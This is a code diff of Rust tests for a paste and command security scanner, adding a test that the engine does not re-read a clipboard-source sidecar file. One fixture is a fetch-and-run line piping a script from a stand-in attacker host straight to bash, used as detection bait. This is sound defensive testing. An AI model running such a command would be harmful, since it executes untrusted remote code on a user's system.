@@ -96,7 +96,7 @@ fn run_fixture(fixture: &Fixture) {
         is_config_override: false,
         clipboard_html: None,
         card_ref: None,
-        clipboard_source: None,
+        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
     };
 
     let verdict = engine::analyze(&ctx);
@@ -1635,7 +1635,7 @@ fn test_tier1_does_not_gate_findings() {
             is_config_override: false,
             clipboard_html: None,
             card_ref: None,
-            clipboard_source: None,
+            clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
         };
 
         let verdict = engine::analyze(&ctx);
@@ -1683,7 +1683,7 @@ fn test_non_ascii_paste_not_sole_warn() {
             is_config_override: false,
             clipboard_html: None,
             card_ref: None,
-            clipboard_source: None,
+            clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
         };
         let verdict = engine::analyze(&ctx);
         assert_eq!(
@@ -1842,7 +1842,7 @@ fn test_lab_corpus_reaches_tier3() {
             is_config_override: false,
             clipboard_html: None,
             card_ref: None,
-            clipboard_source: None,
+            clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
         };
 
         let verdict = engine::analyze(&ctx);
@@ -1964,7 +1964,7 @@ fn context_rule_blocks_kubectl_delete_in_labeled_prod() {
         is_config_override: false,
         clipboard_html: None,
         card_ref: None,
-        clipboard_source: None,
+        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
     };
 
     let verdict = engine::analyze(&ctx);
@@ -2039,7 +2039,7 @@ fn context_rule_allows_kubectl_get_in_labeled_prod() {
         is_config_override: false,
         clipboard_html: None,
         card_ref: None,
-        clipboard_source: None,
+        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
     };
 
     let verdict = engine::analyze(&ctx);
@@ -2116,7 +2116,7 @@ fn ssh_rule_blocks_destructive_on_labeled_host() {
         is_config_override: false,
         clipboard_html: None,
         card_ref: None,
-        clipboard_source: None,
+        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
     };
     let verdict = engine::analyze(&ctx);
 
@@ -2172,7 +2172,7 @@ fn ssh_rule_emits_info_on_bare_labeled_host() {
         is_config_override: false,
         clipboard_html: None,
         card_ref: None,
-        clipboard_source: None,
+        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
     };
     let verdict = engine::analyze(&ctx);
 
@@ -2230,7 +2230,7 @@ fn ssh_rule_allows_unlabeled_host_with_destructive_inner() {
         is_config_override: false,
         clipboard_html: None,
         card_ref: None,
-        clipboard_source: None,
+        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
     };
     let verdict = engine::analyze(&ctx);
 
@@ -2299,7 +2299,7 @@ fn iac_rule_blocks_apply_without_plan_when_policy_on() {
         is_config_override: false,
         clipboard_html: None,
         card_ref: None,
-        clipboard_source: None,
+        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
     };
     let verdict = engine::analyze(&ctx);
 
@@ -2365,7 +2365,7 @@ fn iac_rule_blocks_plan_hash_mismatch_when_policy_on() {
         is_config_override: false,
         clipboard_html: None,
         card_ref: None,
-        clipboard_source: None,
+        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
     };
     let verdict = engine::analyze(&ctx);
 
@@ -2445,7 +2445,7 @@ fn iac_rule_detects_plan_modification_after_record() {
             is_config_override: false,
             clipboard_html: None,
             card_ref: None,
-            clipboard_source: None,
+            clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
         };
         engine::analyze(&ctx)
     };
@@ -2491,6 +2491,120 @@ fn iac_rule_detects_plan_modification_after_record() {
         modified_mismatch,
         "modified plan file MUST fire IacPlanHashMismatch; got: {:?}",
         v_modified
+            .findings
+            .iter()
+            .map(|f| format!("{}: {}", f.rule_id, f.title))
+            .collect::<Vec<_>>(),
+    );
+}
+
+// ---------------------------------------------------------------------------
+// M12 ch1 — the `ClipboardSourceState` tri-state completes the G1 TOCTOU fix:
+// when the caller (`tirith paste --with-source`) read the companion sidecar and
+// found nothing, it sets `AbsentOrInvalid`, and the engine must NOT re-read
+// `clipboard_source.json` from disk. If it re-read, a sidecar written between the
+// CLI's read and the engine's could fire `PasteSourceMismatch` while the CLI
+// displayed "no source" — the exact disagreement the tri-state closes.
+//
+// This test plants a MATCHING sidecar on disk (so a disk read WOULD fire the
+// rule), then proves:
+//   * `AbsentOrInvalid` → the engine reads NOTHING, so no `PasteSourceMismatch`;
+//   * `Unread` (positive control, same on-disk record) → the engine DOES read it
+//     and the rule fires — confirming the planted record is genuinely matchable,
+//     so the negative assertion above is meaningful (not a false pass).
+// Shares `CONTEXT_TEST_LOCK` because it mutates `XDG_STATE_HOME`.
+// ---------------------------------------------------------------------------
+#[test]
+fn paste_source_absent_or_invalid_does_not_reread_sidecar() {
+    use tirith_core::clipboard::ClipboardSourceState;
+    use tirith_core::verdict::RuleId;
+
+    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+
+    // A paste that pipes to a shell (so it reaches tier 3 regardless of the
+    // paste-source force-past) and carries a destination host that differs from
+    // the recorded source host — the shape that fires `PasteSourceMismatch` at
+    // HIGH (host mismatch + pipe-to-interpreter) IF the record is consulted.
+    let paste = "curl https://evil.example/install.sh | bash";
+    // SHA-256 of `paste` (verified with `shasum -a 256`). The planted record's
+    // `content_sha256` matches this exactly, so the engine WOULD attribute the
+    // paste if it read the sidecar.
+    let content_sha256 = "297a6c24cd4330141c0642e0e5dc088e24839b7cf1b65d7a4813dd8f401caaaa";
+
+    // Isolate `state_dir()` under a temp `XDG_STATE_HOME` and plant a MATCHING
+    // record at `state_dir()/clipboard_source.json` whose recorded source host
+    // (`docs.trusted.example`) differs from the paste's destination host.
+    let dir = tempfile::tempdir().unwrap();
+    let state_dir = dir.path().join("state");
+    let tirith_state = state_dir.join("tirith");
+    fs::create_dir_all(&tirith_state).unwrap();
+    let record_json = format!(
+        r#"{{"updated_at":"2026-05-30T00:00:00Z","content_sha256":"{content_sha256}","source_url":"https://docs.trusted.example/install","source_title":"Install Guide","hidden_text_detected":false}}"#
+    );
+    fs::write(tirith_state.join("clipboard_source.json"), record_json).unwrap();
+
+    let prev_xdg = std::env::var_os("XDG_STATE_HOME");
+    unsafe {
+        std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
+    }
+
+    // Build a Paste context with the given clipboard-source tri-state. `raw_bytes`
+    // mirrors the real `tirith paste` path (the byte-scan reads it at tier 1).
+    let analyze_paste = |state: ClipboardSourceState| {
+        let ctx = AnalysisContext {
+            input: paste.to_string(),
+            shell: ShellType::Posix,
+            scan_context: ScanContext::Paste,
+            raw_bytes: Some(paste.as_bytes().to_vec()),
+            interactive: false,
+            cwd: None,
+            file_path: None,
+            repo_root: None,
+            is_config_override: false,
+            clipboard_html: None,
+            card_ref: None,
+            clipboard_source: state,
+        };
+        engine::analyze(&ctx)
+    };
+
+    let absent = analyze_paste(ClipboardSourceState::AbsentOrInvalid);
+    // Positive control: the SAME on-disk record IS matchable via the read path.
+    let unread = analyze_paste(ClipboardSourceState::Unread);
+
+    unsafe {
+        match prev_xdg {
+            Some(v) => std::env::set_var("XDG_STATE_HOME", v),
+            None => std::env::remove_var("XDG_STATE_HOME"),
+        }
+    }
+
+    // AbsentOrInvalid: the engine must not have re-read the sidecar, so no
+    // attribution and no mismatch finding — even though a matching record sits on
+    // disk.
+    assert!(
+        !absent
+            .findings
+            .iter()
+            .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
+        "AbsentOrInvalid must NOT re-read the sidecar; PasteSourceMismatch fired anyway: {:?}",
+        absent
+            .findings
+            .iter()
+            .map(|f| format!("{}: {}", f.rule_id, f.title))
+            .collect::<Vec<_>>(),
+    );
+
+    // Unread (control): the engine DID read the planted record, so the mismatch
+    // fires — proving the record is genuinely matchable and the assertion above is
+    // not a false pass against a non-matching record.
+    assert!(
+        unread
+            .findings
+            .iter()
+            .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
+        "Unread must read the planted sidecar and fire PasteSourceMismatch; got: {:?}",
+        unread
             .findings
             .iter()
             .map(|f| format!("{}: {}", f.rule_id, f.title))
